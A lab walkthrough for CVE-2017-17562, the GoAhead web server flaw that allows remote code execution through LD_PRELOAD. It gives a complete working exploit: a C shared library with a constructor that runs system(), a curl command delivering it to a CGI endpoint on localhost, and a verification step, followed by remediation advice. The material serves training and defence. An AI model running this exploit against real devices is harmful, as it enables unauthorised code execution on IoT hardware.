# GoAhead Embedded Web Server LD_PRELOAD Remote Code Execution (CVE-2017-17562)

## Overview

GoAhead is an embedded web server deployed in millions of IoT routers, IP cameras, printers, and smart devices. In GoAhead versions prior to 3.6.5, the CGI handler initializes environment variables from HTTP request parameters without sanitization. An attacker can supply LD_PRELOAD=/proc/self/fd/0 in the query string and post a compiled ELF shared library in the request body, causing the dynamic linker to execute arbitrary code upon CGI invocation.

- **Service Access**: `http://localhost:8149/`
- **Default Credentials**: `Unauthenticated CGI endpoint`
- **Docker Shortcut**: `./lab start goahead-rce`
- **Container Name**: `cyberlab_industry_goahead_rce`
- **RAM Footprint**: ~50M

---

## Exploitation Walkthrough

### 1. Compile Malicious Shared Library

```bash
gcc -shared -fPIC -o /tmp/payload.so -xc - << 'EOF'
#include <stdlib.h>
static void init(void) __attribute__((constructor));
void init(void) {
    system("touch /tmp/pwned_goahead");
}
EOF
```

### 2. Inject Payload via LD_PRELOAD and CGI Standard Input

```bash
curl -X POST --data-binary @/tmp/payload.so 'http://localhost:8149/cgi-bin/cgitest?LD_PRELOAD=/proc/self/fd/0'
```

### 3. Verify File Creation

```bash
docker exec -it cyberlab_industry_goahead_rce ls -la /tmp/pwned_goahead
```

---

## Defensive Remediation & Hardening

1. Upgrade GoAhead to version 3.6.5 or 4.0.1 or higher.
2. Sanitize all CGI parameter names and strip LD_ prefix strings.
3. Disable CGI modules on embedded firmware unless strictly required.

---

## Video Walkthroughs & Technical References

- [The 'Ancient' Bug That Still Owns Modern Servers: CGI RCE Explained](https://www.youtube.com/watch?v=ncJOuqoMgFM)
- [GoAhead CVE-2017-17562 Advisory](https://www.embedthis.com/blog/posts/2017/goahead-security-release.html)
- [Vulhub GoAhead Environment](https://vulhub.org/#/environments/goahead/CVE-2017-17562/)
